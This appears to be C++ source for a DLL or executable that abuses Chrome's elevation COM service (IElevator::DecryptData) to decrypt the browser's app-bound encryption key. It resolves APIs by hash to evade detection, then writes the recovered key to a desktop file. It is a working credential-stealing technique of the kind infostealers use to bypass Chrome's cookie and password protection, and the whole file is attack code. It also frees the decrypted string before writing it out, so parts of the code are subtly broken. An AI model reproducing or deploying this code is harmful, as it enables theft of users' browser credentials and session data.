// dllmain.cpp : Defines the entry point for the DLL application.
#include <objbase.h>
#include <string>
#include <vector>
#include "Base64.h"
#include "ApiResolve.h"
#include "HashString.h"
#include "CRT.h"

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevator IElevator;

typedef struct IElevatorVtbl
{
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevator* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevator* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevator* This);

    // IElevator
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevator* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevator* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevator* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorVtbl;

struct IElevator
{
    IElevatorVtbl* lpVtbl;
};



void DecryptKey() {
    CLSID ChromeCLSID = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
    IID ChromeIID = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
    IID ChromeIID2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };
    IElevator* pElevator = NULL;
    HRESULT hr;

    ApiResolve apiResolve;
    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(ComplexHashForWChar(L"kernel32.dll"));
    if (!lpKernel32) {
        return;
    }

    typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)apiResolve.GetApiAddress(lpKernel32, ComplexHashForAnsi("LoadLibraryA"));
    if (!pLoadLibraryA) {
        return;
    }

    char sOle32[] = {'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0'};
    HMODULE hOle32 = pLoadLibraryA(sOle32);

    typedef HRESULT (WINAPI* _CoInitializeEx)(
        LPVOID pvReserved,
        DWORD  dwCoInit
    );

    _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(hOle32, ComplexHashForAnsi("CoInitializeEx"));
    if (!pCoInitializeEx) {
        return;
    }

    hr = pCoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        MessageBoxA(NULL, "Failed to initialize COM library.", "Error", MB_OK | MB_ICONERROR);
        // Handle initialization failure
        return;
    }

    hr = CoCreateInstance(
        ChromeCLSID,
        nullptr,
        CLSCTX_LOCAL_SERVER,
        ChromeIID2,
        reinterpret_cast<void**>(&pElevator)
    );

    if (FAILED(hr)) {
        hr = CoCreateInstance(
            ChromeCLSID,
            nullptr,
            CLSCTX_LOCAL_SERVER,
            ChromeIID,
            reinterpret_cast<void**>(&pElevator)
        );
    }
    if (FAILED(hr)) {
        char errorMsg[256];
        sprintf_s(errorMsg, "Failed to create COM instance. HRESULT: 0x%08X", (unsigned int)hr);
        MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
        CoUninitialize();
        return;
    }

    hr = CoSetProxyBlanket(
        (IUnknown*)pElevator,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );


    BSTR decryptedDataBSTR = NULL;
    DWORD dwLastError = 0;
    const char* encKeyB64 = "QVBQQgEAAADQjJ3fARXREYx6AMBPwpfrAQAAACe9F1v8CcVDvnlZ8VsbWkEQAAAAHAAAAEcAbwBvAGcAbABlACAAQwBoAHIAbwBtAGUAAAAQZgAAAAEAACAAAABP5Xys4rGNKfCdkBMFOM6taA8pp8cKUdCvptcFZiyKugAAAAAOgAAAAAIAACAAAADJA095Jn/0nN+TPlnKzK/7uDrgGOPHqC2IM8vaGXhM9JABAAA4YGZ8tnnbxJC4IfrBWmuaFKEPIFFYTg9LFC/6LeSVWcr8IclO+s69V0zFOkP4V4Qvugr+Y24FziPparN+Dq0c2yGPNZS/XfZ7viMr93tQu8Du7/ENZ+TUJm0T8XqLXIgnDH5xSE1AsWsREw4X7FebCX9YY50hvxDPQXaS//Ap1DZ/soogLtVtZEXs1bI6aTZ5jIoVPCshD93aX4q9OSeVTzNNzFXEOIJl9idLfOb+X4VfjlLKyuQdK8Dx79r642CcjlB1dOd1L8WlP5bIXqz5hHB09hMOs0mR5/UY8aTqp2e3wHGsw3xZeC7vje06HMCl0J+rCKGkERP5BQH3/jpk0a0u2eEEWyABsRTprUUwCvgAu6whxwCwROxhAO+68XF663uAxOUN9K0wy3WT2T6lOArKxVpHYTAFqPLOox9dxQ0Pa0j1EC/MJSBCbzBhRpBph5L1om8RMf7LHVN7+cjrHAJtHOKdjQwKu9dUAyG5uu+PlCj47dRCIIMw5Yg9a5kt0YILmJWo5SEqgDIORMSJQAAAADd3b0EifF3jgUlhUBjGJsEO+Cep69y209XypR5shEUi3/If2JvTh5a4AOtb3nDM5YxEkijF5NiV+bmBplb0OgI=";
    int length = 0;
    char* encKey = Base64Decode(encKeyB64, length);

    BSTR bstrEncKey = SysAllocStringByteLen(encKey + 4, StrLen(encKey) - 4);

    hr = pElevator->lpVtbl->DecryptData(pElevator, bstrEncKey, &decryptedDataBSTR, &dwLastError);

    if (bstrEncKey) {
        SysFreeString(bstrEncKey);
    }

    if (FAILED(hr)) {
        char errorMsg[256];
        sprintf_s(errorMsg, "Failed to decrypt data. HRESULT: 0x%08X", (unsigned int)hr);
        MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
        // Handle decryption failure
    }
    else {
        //MessageBox if decryption is successful
        MessageBoxA(NULL, (char*)decryptedDataBSTR, "Decrypted Data", MB_OK | MB_ICONINFORMATION);
        SysFreeString(decryptedDataBSTR);
        //Write key to file in desktop
        HANDLE hFile = CreateFileA("C:\\Users\\levuong\\Desktop\\decrypted_key.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(hFile, decryptedDataBSTR, SysStringByteLen(decryptedDataBSTR), NULL, NULL);
        CloseHandle(hFile);
    }
}

int main() {
    DecryptKey();
}
